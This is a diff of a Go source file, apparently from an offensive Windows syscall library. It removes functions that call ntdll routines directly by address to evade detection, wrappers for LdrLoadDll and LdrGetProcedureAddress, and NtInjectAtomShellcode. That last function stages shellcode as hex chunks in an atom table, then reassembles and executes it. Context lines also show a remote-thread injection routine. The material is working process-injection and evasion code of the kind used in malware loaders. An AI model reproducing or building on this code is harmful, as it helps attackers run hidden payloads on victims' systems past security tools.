@@ -8,8 +8,6 @@ import (
 	"sync"
 	"time"
 	"unsafe"
-	"strings"
-	"encoding/hex"
 	"github.com/Binject/debug/pe"
 	"github.com/carved4/go-native-syscall/pkg/debug"
 	"github.com/carved4/go-native-syscall/pkg/obf"
@@ -56,12 +54,6 @@ func GetCurrentThreadHandle() uintptr {
 func GetCurrentProcessId() uintptr {
 	pid := os.Getpid()
 	return uintptr(pid)
-}
-
-// DirectCall executes a direct call to any Windows API function by address
-// This is different from DirectSyscall - it calls regular API functions, not syscalls
-func DirectCall(functionAddr uintptr, args ...uintptr) (uintptr, error) {
-	return syscall.DirectCall(functionAddr, args...)
 }
 
 // GetSyscallNumber returns the syscall number for a given function name
@@ -1261,64 +1253,8 @@ func initNtdllCache() error {
 	return nil
 }
 
-// FindNtdllFunction searches for a specific function in ntdll by name using cache
-// Returns the function information including address for direct calling
-func FindNtdllFunction(functionName string) (*FunctionInfo, error) {
-	// Try read lock first for cache lookup
-	ntdllCacheMutex.RLock()
-	if ntdllCacheInit {
-		if funcInfo, exists := ntdllFunctionCache[functionName]; exists {
-			ntdllCacheMutex.RUnlock()
-			debug.Printfln("WINAPI", "Found cached function %s at address 0x%X\n", functionName, funcInfo.Address)
-			return funcInfo, nil
-		}
-		ntdllCacheMutex.RUnlock()
-		return nil, fmt.Errorf("function %s not found in ntdll", functionName)
-	}
-	ntdllCacheMutex.RUnlock()
-	
-	// Cache not initialized, initialize it
-	if err := initNtdllCache(); err != nil {
-		return nil, err
-	}
-	
-	// Try lookup again after initialization
-	ntdllCacheMutex.RLock()
-	defer ntdllCacheMutex.RUnlock()
-	
-	if funcInfo, exists := ntdllFunctionCache[functionName]; exists {
-		debug.Printfln("WINAPI", "Found function %s at address 0x%X\n", functionName, funcInfo.Address)
-		return funcInfo, nil
-	}
-	
-	return nil, fmt.Errorf("function %s not found in ntdll", functionName)
-}
 
-// CallNtdllFunction calls any ntdll function by name using DirectCall
-// For syscalls, use DirectSyscall instead for better evasion
-func CallNtdllFunction(functionName string, args ...uintptr) (uintptr, error) {
-	funcInfo, err := FindNtdllFunction(functionName)
-	if err != nil {
-		return 0, err
-	}
-	
-	if funcInfo.IsSyscall {
-		debug.Printfln("WINAPI", "Warning: %s is a syscall, consider using DirectSyscall for better evasion\n", functionName)
-	}
-	
-	debug.Printfln("WINAPI", "Calling %s at 0x%X with %d arguments\n", functionName, funcInfo.Address, len(args))
-	return DirectCall(funcInfo.Address, args...)
-}
 
-// GetNtdllFunctionAddress returns the address of a function in ntdll
-// Useful when you want to call the function multiple times without lookup overhead
-func GetNtdllFunctionAddress(functionName string) (uintptr, error) {
-	funcInfo, err := FindNtdllFunction(functionName)
-	if err != nil {
-		return 0, err
-	}
-	return funcInfo.Address, nil
-}
 
 // PrewarmNtdllCache preloads all ntdll function information for better performance
 // This should be called early in your application to improve function resolution speed
@@ -1375,79 +1311,6 @@ func ClearNtdllCache() {
 	debug.Printfln("WINAPI", "Ntdll function cache cleared\n")
 }
 
-// LdrLoadDll loads a DLL using the ntdll LdrLoadDll function  
-// This is a direct call to ntdll without going through kernel32
-func LdrLoadDll(dllPath string) (uintptr, error) {
-	// Convert string to UNICODE_STRING for LdrLoadDll
-	utfPath := StringToUTF16(dllPath)
-	
-	// Count the actual UTF-16 length (excluding null terminator)
-	pathLen := uint16(0)
-	ptr := utfPath
-	for *ptr != 0 {
-		pathLen += 2 // Each UTF-16 character is 2 bytes
-		ptr = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + 2))
-	}
-
-	unicodeString := UNICODE_STRING{
-		Length:        pathLen,
-		MaximumLength: pathLen + 2,
-		Buffer:        utfPath,
-	}
-	
-	var moduleHandle uintptr
-	
-	// Call LdrLoadDll: NTSTATUS LdrLoadDll(PWCHAR DllPath, PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID *DllHandle)
-	result, err := CallNtdllFunction("LdrLoadDll",
-		0, // DllPath (NULL for search in standard locations)
-		0, // DllCharacteristics (NULL)
-		uintptr(unsafe.Pointer(&unicodeString)), // DllName
-		uintptr(unsafe.Pointer(&moduleHandle)))  // DllHandle
-	
-	if err != nil {
-		return 0, fmt.Errorf("LdrLoadDll call failed: %v", err)
-	}
-	
-	if result != STATUS_SUCCESS {
-		return 0, fmt.Errorf("LdrLoadDll failed with status: %s", FormatNTStatus(result))
-	}
-	
-	debug.Printfln("WINAPI", "LdrLoadDll loaded %s at handle 0x%X\n", dllPath, moduleHandle)
-	return moduleHandle, nil
-}
-
-// LdrGetProcedureAddress gets the address of a function in a loaded module
-// This is a direct call to ntdll without going through kernel32
-func LdrGetProcedureAddress(moduleHandle uintptr, functionName string) (uintptr, error) {
-	// Convert function name to ANSI_STRING for LdrGetProcedureAddress
-	nameBytes := []byte(functionName)
-	
-	ansiString := ANSI_STRING{
-		Length:        uint16(len(nameBytes)),
-		MaximumLength: uint16(len(nameBytes)),
-		Buffer:        &nameBytes[0],
-	}
-	
-	var functionAddress uintptr
-	
-	// Call LdrGetProcedureAddress: NTSTATUS LdrGetProcedureAddress(HMODULE ModuleHandle, PANSI_STRING FunctionName, WORD Ordinal, PVOID *FunctionAddress)
-	result, err := CallNtdllFunction("LdrGetProcedureAddress",
-		moduleHandle,
-		uintptr(unsafe.Pointer(&ansiString)),
-		0, // Ordinal (0 means use name)
-		uintptr(unsafe.Pointer(&functionAddress)))
-	
-	if err != nil {
-		return 0, fmt.Errorf("LdrGetProcedureAddress call failed: %v", err)
-	}
-	
-	if result != STATUS_SUCCESS {
-		return 0, fmt.Errorf("LdrGetProcedureAddress failed with status: %s", FormatNTStatus(result))
-	}
-	
-	debug.Printfln("WINAPI", "LdrGetProcedureAddress found %s at address 0x%X\n", functionName, functionAddress)
-	return functionAddress, nil
-}
 
 // DumpAllSyscallsWithFiles enumerates all syscall functions and exports to both JSON and Go files
 // This is the enhanced version that generates both JSON and Go syscall table files
@@ -1955,95 +1818,6 @@ func NtInjectRemote(processHandle uintptr, payload []byte) error {
 	}
 	
 	debug.Printfln("WINAPI", "Remote thread created and running - not waiting for completion\n")
-
-	return nil
-}
-
-func NtInjectAtomShellcode(shellcode []byte) error {
-	// 1. Initialize atom package
-	_, err := CallNtdllFunction("RtlInitializeAtomPackage")
-	if err != nil {
-		return fmt.Errorf("failed to initialize atom package: %v", err)
-	}
-
-	// 2. Create an atom table
-	var atomTable uintptr
-	_, err = CallNtdllFunction("RtlCreateAtomTable",
-		uintptr(37), // Number of buckets
-		uintptr(unsafe.Pointer(&atomTable)))
-	if err != nil {
-		return fmt.Errorf("failed to create atom table: %v", err)
-	}
-	defer CallNtdllFunction("RtlDestroyAtomTable", atomTable)
-
-	// 3. Prepare and store shellcode in chunks
-	shellcodeHex := hex.EncodeToString(shellcode)
-	const chunkSize = 120
-	var atoms []uint16
-
-	for i := 0; i*chunkSize < len(shellcodeHex); i++ {
-		start := i * chunkSize
-		end := start + chunkSize
-		if end > len(shellcodeHex) {
-			end = len(shellcodeHex)
-		}
-		chunk := shellcodeHex[start:end]
-		prefixedChunk := fmt.Sprintf("sc_%d:%s", i, chunk)
-
-		wideStr, err := utf16PtrFromString(prefixedChunk)
-		if err != nil {
-			return fmt.Errorf("failed to create wide string for chunk %d: %v", i, err)
-		}
-
-		var atom uint16
-		_, err = CallNtdllFunction("RtlAddAtomToAtomTable",
-			atomTable,
-			uintptr(unsafe.Pointer(wideStr)),
-			uintptr(unsafe.Pointer(&atom)))
-		if err != nil {
-			return fmt.Errorf("failed to add chunk %d to atom table: %v", i, err)
-		}
-		atoms = append(atoms, atom)
-	}
-
-	// 4. Retrieve shellcode from atoms
-	retrievedHexParts := make([]string, len(atoms))
-	for i, atom := range atoms {
-		resultBuffer := make([]uint16, 512)
-		var atomNameLength uint32 = uint32(len(resultBuffer))
-		_, err := CallNtdllFunction("RtlQueryAtomInAtomTable",
-			atomTable,
-			uintptr(atom),
-			uintptr(0), uintptr(0),
-			uintptr(unsafe.Pointer(&resultBuffer[0])),
-			uintptr(unsafe.Pointer(&atomNameLength)))
-		if err != nil {
-			return fmt.Errorf("failed to query atom 0x%04x: %v", atom, err)
-		}
-
-		retrievedString := utf16ToString(&resultBuffer[0], len(resultBuffer))
-		expectedPrefix := fmt.Sprintf("sc_%d:", i)
-		if !strings.HasPrefix(retrievedString, expectedPrefix) {
-			return fmt.Errorf("retrieved string for chunk %d has wrong prefix", i)
-		}
-		retrievedHexParts[i] = strings.TrimPrefix(retrievedString, expectedPrefix)
-	}
-
-	// 5. Reconstruct and execute shellcode
-	fullHex := strings.Join(retrievedHexParts, "")
-	if fullHex != shellcodeHex {
-		return fmt.Errorf("reconstructed shellcode does not match original")
-	}
-
-	reconstructedShellcode, err := hex.DecodeString(fullHex)
-	if err != nil {
-		return fmt.Errorf("failed to decode reconstructed hex: %v", err)
-	}
-
-	err = NtInjectSelfShellcode(reconstructedShellcode)
-	if err != nil {
-		return fmt.Errorf("shellcode execution failed: %v", err)
-	}
 
 	return nil
 }
